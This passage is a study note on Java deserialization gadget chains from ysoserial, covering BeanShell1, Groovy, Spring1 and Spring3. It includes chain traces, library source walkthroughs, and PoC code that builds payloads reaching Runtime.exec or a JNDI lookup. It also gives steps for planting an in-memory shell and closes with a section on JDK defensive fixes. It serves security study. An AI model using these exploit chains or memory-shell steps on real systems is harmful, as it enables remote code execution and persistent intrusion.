PriorityQueue queue = new PriorityQueue(2, comparator);  
  
queue.add(new BigInteger("1"));  
queue.add(new BigInteger("1"));  
  
Reflections.setFieldValue(comparator, "property", "databaseMetaData");  
Reflections.setFieldValue(queue, "queue", new Object[]{rs, rs});  
return queue;
```

---

## BeanShell

### BeanShell1  [CVE-2016-2510](https://github.com/advisories/GHSA-gxg6-rc6c-v673 "CVE-2016-2510")

> [!NOTE] pre-requirements
> Reproduced on JDK1.8
> org.beanshell:bsh:2.0b5 (fixed in 2.0b6)


```java
//Gadget chain:
invokeMethod:233, This (bsh)
invokeMethod:174, This (bsh)
invokeImpl:194, XThis$Handler (bsh)
invoke:131, XThis$Handler (bsh)
compare:-1, $Proxy5 (com.sun.proxy)
siftDownUsingComparator:721, PriorityQueue (java.util)
siftDown:687, PriorityQueue (java.util)
heapify:736, PriorityQueue (java.util)
readObject:796, PriorityQueue (java.util)
```

Firstly, let's take a glance into `bsh.XThis`. It has a member named by `invocationHandler` with `XThis$Handler` type. `Handler` implements `InvocationHandler` interface and delegates methods invocation request to the method with the same signature in current namespace. To check this, step into `This.invokeMethod()`:
```java
public Object invokeMethod(   
   String methodName, Object [] args,   
Interpreter interpreter, CallStack callstack, SimpleNode callerInfo,   
boolean declaredOnly  )   
   throws EvalError  
{
	...
	Class [] types = Types.getTypes( args );  
	BshMethod bshMethod = null;  
	try {  
	   bshMethod = namespace.getMethod( methodName, types, declaredOnly );  
	} catch ( UtilEvalError e ) {  
	   // leave null  
	}  
	  
	if ( bshMethod != null )  
	   return bshMethod.invoke( args, interpreter, callstack, callerInfo );
	...
}
```
This means that we can extract the `invocationHandler` of a `XThis` object and build a proxy on it. When a method like `compare()` is invoked on this proxy, it would result in the invocation of the bsh method `compare()` defined in current namespace. And the `invocationHandler` does not require any modification. What we should do is to define a `compare()` method by bsh interpreter.

Poc:
```java
String payload = BeanShellUtil.makeBeanShellPayload(command);  
// payload: compare(Object su18, Object su19) {new java.lang.ProcessBuilder(new String[]{"calc.exe"}
Interpreter i = new Interpreter();  
Reflections.getMethodAndInvoke(i, "setu", new Class[]{String.class, Object.class}, new Object[]{"bsh.cwd", "."});  
i.eval(payload);  
XThis xt = new XThis(i.getNameSpace(), i);  
InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);  
Comparator<? super Object> comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);  
PriorityQueue<Object> priorityQueue = new PriorityQueue(2, comparator);  
Object[] queue = {Integer.valueOf(1), Integer.valueOf(1)};  
Reflections.setFieldValue(priorityQueue, "queue", queue);  
Reflections.setFieldValue(priorityQueue, "size", Integer.valueOf(2));  
return priorityQueue;
```

## Groovy


> [!NOTE] pre-requirements
> Reproduced on JDK1.8
> org.codehaus.groovy:groovy:2.3.9

This gadget can use both `AnnotationInvocationHandler` or `PriorityQueue`, we use the later as example.

```java
//Gadget chain:
execute:530, ProcessGroovyMethods (org.codehaus.groovy.runtime)
doMethodInvoke:-1, dgm$748 (org.codehaus.groovy.runtime)
invokeMethod:1207, MetaClassImpl (groovy.lang)
invokeMethod:1074, MetaClassImpl (groovy.lang)
invokeMethod:1016, MetaClassImpl (groovy.lang)
call:423, Closure (groovy.lang)
invokeCustom:51, ConvertedClosure (org.codehaus.groovy.runtime)
invoke:103, ConversionHandler (org.codehaus.groovy.runtime)
entrySet:-1, $Proxy4 (com.sun.proxy)
readObject:452, AnnotationInvocationHandler (sun.reflect.annotation)
```

Poc:
```java
final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");  
  
final Map map = Gadgets.createProxy(closure, Map.class);  
  
final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);  
  
return handler;
```

The `ConvertedClosure` class is an `InvocationHandler` bounded to a single method, i.e. only if its bounded method can be invoked. And the invocation can be delegated to another `Closure`(here is `MethodClosure`).
Step into its super class `ConversionHandler`:
```java
public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {  
    VMPlugin plugin = VMPluginFactory.getPlugin();  
    if (plugin.getVersion()>=7 && isDefaultMethod(method)) {  
        Object handle = handleCache.get(method);  
        if (handle == null) {  
            handle = plugin.getInvokeSpecialHandle(method, proxy);  
            handleCache.put(method, handle);  
        }  
        return plugin.invokeHandle(handle, args);  
    }  
  
    if (!checkMethod(method)) {  
        try {  
            return invokeCustom(proxy, method, args);  
        } catch (GroovyRuntimeException gre) {  
            throw ScriptBytecodeAdapter.unwrap(gre);  
        }  
    }  
  
    try {  
        return method.invoke(this, args);  
    } catch (InvocationTargetException ite) {  
        throw ite.getTargetException();  
    }  
}
```

We should make control dive into `invokeCustom()`.
Look at `ConvertedClosure`:
```java
public Object invokeCustom(Object proxy, Method method, Object[] args)  
throws Throwable {  
    if (methodName!=null && !methodName.equals(method.getName())) return null;  
    return ((Closure) getDelegate()).call(args);  
}
```

In `MethodClosure`:
```java
protected Object doCall(Object arguments) {
    return InvokerHelper.invokeMethod(getOwner(), method, arguments);  
}
```

Finally, in `ProcessGroovyMethods`:
```java
public static Process execute(final String self) throws IOException {  
    return Runtime.getRuntime().exec(self);  
}
```


So the whole procedure is: 
deserialize `AnnotationInvocationHandler`  => 
`entrySet()` is called upon `ConvertedClosure` =>
delegate to `MethodClosure` =>
call groovy integrated method `execute()`

End.

## Spring
### Spring1

> [!NOTE] pre-requirements
> JDK1.7
> org.springframework:spring-core:4.1.4.RELEASE
> 

```java
//Gadget chain:

ObjectInputStream.readObject()
	SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
		SerializableTypeWrapper.TypeProvider(Proxy).getType()
			AnnotationInvocationHandler.invoke()
				HashMap.get()
		ReflectionUtils.findMethod()
		SerializableTypeWrapper.TypeProvider(Proxy).getType()
			AnnotationInvocationHandler.invoke()
				HashMap.get()
		ReflectionUtils.invokeMethod()
			Method.invoke()
				Templates(Proxy).newTransformer()
					AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
						ObjectFactory(Proxy).getObject()
							AnnotationInvocationHandler.invoke()
								HashMap.get()
						Method.invoke()
							TemplatesImpl.newTransformer()
								TemplatesImpl.getTransletInstance()
									TemplatesImpl.defineTransletClasses()
										TemplatesImpl.TransletClassLoader.defineClass()
											Pwner*(Javassist-generated).<static init>
												Runtime.exec()
```

#### AnnotationInvocationHandler special functionality
The `AnnotationInvocationHandler` class is able to overwrite a proxied method, return the designated value when call it. We can look at its `invoke()`:
```java
public Object invoke(Object proxy, Method method, Object[] args) {
	...
	Object result = memberValues.get(member);
	...
	return result;
}
```
And `memberValues` is built within `readObject()`:
```java
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {
    ...
    Map<String, Object> streamVals = (Map<String, Object>)fields.get("memberValues", null);
    ...
    for (Map.Entry<String, Object> memberValue : streamVals.entrySet()) {
	    ...
	    mv.put(name, value);
	    ...
	}
	UnsafeAccessor.setMemberValues(this, mv);
}
```
There is an constraint that the type of `memberValues` should equals to that of the return type of the method to be hooked.

#### Kick-off : MethodInvokeTypeProvider
`MethodInvokeTypeProvider` class is an inner class of `org.springframework.core.SerializableTypeWrapper`. In its `readObject()`:
```java
private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException {  
   inputStream.defaultReadObject();  
   Method method = ReflectionUtils.findMethod(this.provider.getType().getClass(), this.methodName);  
   this.result = ReflectionUtils.invokeMethod(method, this.provider.getType());  
}
```
If we can control `methodName` and `provider.getType()`, then we can execute any code.
By using the measure introduced [[Java Deserialize Vulnerabilities ysoserial study#AnnotationInvocationHandler special functionality|here]], we can hook `getType()` to return an object in `Type` class. It is expected to get a `TemplatesImpl` when call `getType()` and invoke its `newTransformer()`. So we need to introduce `ObjectFactoryDelegatingInvocationHandler`.

#### ObjectFactoryDelegatingInvocationHandler
It is an inner class of `org.springframework.beans.factory.support.AutowireUtils`. It is an `InvocationHandler`. Let's look at its `invoke()`:
```java
public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {  
    String methodName = method.getName();  
    if (methodName.equals("equals")) {  
        return proxy == args[0];  
    } else if (methodName.equals("hashCode")) {  
        return System.identityHashCode(proxy);  
    } else if (methodName.equals("toString")) {  
        return this.objectFactory.toString();  
    } else {  
        try {  
            return method.invoke(this.objectFactory.getObject(), args);  
        } catch (InvocationTargetException var6) {  
            throw var6.getTargetException();  
        }  
    }  
}
```
The invocation will be delegated to the object returned by `objectFactory`. We can create an `ObjectFactory` proxy and hook `getObject()` method for returning `TemplatesImpl`.
```java
final Object templates = Gadgets.createTemplatesImpl(command);  
  
final ObjectFactory objectFactoryProxy =  
      Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
```
Equip `ObjectFactoryDelegatingInvocationHandler` with this `ObjectFactory` and create a `Type` proxy:
```java
final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)  
      Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")  
         .newInstance(objectFactoryProxy), Type.class, Templates.class);
```

Build `TypeProvider` proxy to hook `getType()`:
```java
final Object typeProviderProxy = Gadgets.createMemoitizedProxy(  
      Gadgets.createMap("getType", typeTemplatesProxy),  
      forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
```

Build `MethodInvokeTypeProvider` and modify `methodName`:
```java
final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");  
final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);  
Reflections.setFieldValue(mitp, "methodName", "newTransformer");
return nitp;
```

Whole Poc:
```java
final Object templates = Gadgets.createTemplatesImpl(command);  
  
final ObjectFactory objectFactoryProxy =  
      Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);  
  
final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)  
      Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")  
         .newInstance(objectFactoryProxy), Type.class, Templates.class);  
  
final Object typeProviderProxy = Gadgets.createMemoitizedProxy(  
      Gadgets.createMap("getType", typeTemplatesProxy),  
      forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));  
  
final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");  
final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);  
Reflections.setFieldValue(mitp, "methodName", "newTransformer");  
  
return mitp;
```

### Spring3

> [!NOTE] pre-requirements
> Reproduced on JDK1.8
> org.springframework:spring-tx:5.2.3.RELEASE
> org.springframework:spring-context:5.2.3.RELEASE
> javax.transaction:javax.transaction-api:1.2

```java
//Gadget chain
lookup:179, JndiTemplate (org.springframework.jndi)
lookupUserTransaction:571, JtaTransactionManager (org.springframework.transaction.jta)
initUserTransactionAndTransactionManager:448, JtaTransactionManager (org.springframework.transaction.jta)
readObject:1206, JtaTransactionManager (org.springframework.transaction.jta)
```

`JtaTransactionManager` class will look up JNDI URL stored in `userTransactionName` when deserializing.
This vul is quite simple without needing to analyze. 
Poc:
```java
String jndiURL = null;  
if (command.toLowerCase().startsWith("jndi:")) {  
   jndiURL = command.substring(5);  
}  
  
JtaTransactionManager manager = new JtaTransactionManager();  
manager.setUserTransactionName(jndiURL);  
return manager;
```


---
# Tips
## Insert memory shell through deserialization vulnerability

1. Create a memory shell class(e.g. `EvilFilter`) and override the required method
2. Write code for inserting memory shell in a static code block of a certain class(normally the memory shell class itself)
3. Select a script engine(JavaScript, BeanShell, Python, etc.). Prepare the script code in which define an evil class to insert memory shell and create a new instance to trigger the static code block
4. Execute script through deserialization vulnerability.



---

## Fixes
### JDK fixes
#### Overview

This article[^1] introduces security updates for serialization in JDK1.8. In summary, there are three strengthening methods introduced in JDK1.8:
1. Override `ObjectInputStream`'s `resolveClass` or `resolveProxyClass` method
2. Use `ValidatingObjectInputStream` to decorate `ObjectInputStream` to deploy white-list validation
3. Create an `ObjectInputFilter` class overriding `checkInput` method, and decorate an `ObjectInputStream` via `setObjectInputFilter` method.

#### `AnnotationInvocationHandler`
Recall [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections1|the exploitation of CC1]], there are two handlers employed, one with a dynamic proxy as `memberValues`(i.e. outer handler) and another which is a member of the proxy object with a `LazyMap` as `memberValues`(i.e. inner handler). While deserialize, it comes in a depth-prior recursion, so the inner handler would be firstly deserialized, after all fields finish deserialization here comes to deserializing the proxy, later the outer handler. 
Let's take a look at the `AnnotationInvocationHandler`'s `readObject` in JDK1.8:
```java
private void readObject(java.io.ObjectInputStream s)  
    throws java.io.IOException, ClassNotFoundException {  
    ObjectInputStream.GetField fields = s.readFields();  
  
    @SuppressWarnings("unchecked")  
    Class<? extends Annotation> t = (Class<? extends Annotation>)fields.get("type", null);  
    @SuppressWarnings("unchecked")  
    Map<String, Object> streamVals = (Map<String, Object>)fields.get("memberValues", null);  
  
    // Check to make sure that types have not evolved incompatibly  
  
    AnnotationType annotationType = null;  
    try {  
        annotationType = AnnotationType.getInstance(t);  
    } catch(IllegalArgumentException e) {  
        // Class is no longer an annotation type; time to punch out  
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");  
    }  
  
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();  
    // consistent with runtime Map type  
    Map<String, Object> mv = new LinkedHashMap<>();  
  
    // If there are annotation members without values, that  
    // situation is handled by the invoke method.    for (Map.Entry<String, Object> memberValue : streamVals.entrySet()) {  
        String name = memberValue.getKey();  
        Object value = null;  
        Class<?> memberType = memberTypes.get(name);  
        if (memberType != null) {  // i.e. member still exists  
            value = memberValue.getValue();  
            if (!(memberType.isInstance(value) ||  
                  value instanceof ExceptionProxy)) {  
                value = new AnnotationTypeMismatchExceptionProxy(  
                            objectToString(value))  
                    .setMember(annotationType.members().get(name));  
            }  
        }  
        mv.put(name, value);  
    }  
  
    UnsafeAccessor.setType(this, t);  
    UnsafeAccessor.setMemberValues(this, mv);  
}
```
The key action falls in the local variable `mv`, now `readObject` will always set the `memberValue` to `LinkedHashMap` whatever its type deserialized. So the `LazyMap` in our CC1 would not be effective.

---

## ysoserial


---

## Problems
### How to test Poc? Do not debug!
IDEA debugger could ignite the key RCE code point, which will lead to confusion like: why does calculator start even before reaching the RCE code? The picture below is an proof that the debugger would call functions of current objects.
![[Pasted image 20231008160842.png]]

---

## Journal
- [x] CC8 not worked


---

## Reference
[^1]: [Paper/浅谈Java反序列化漏洞修复方案.md at master · Cryin/Paper](https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md)
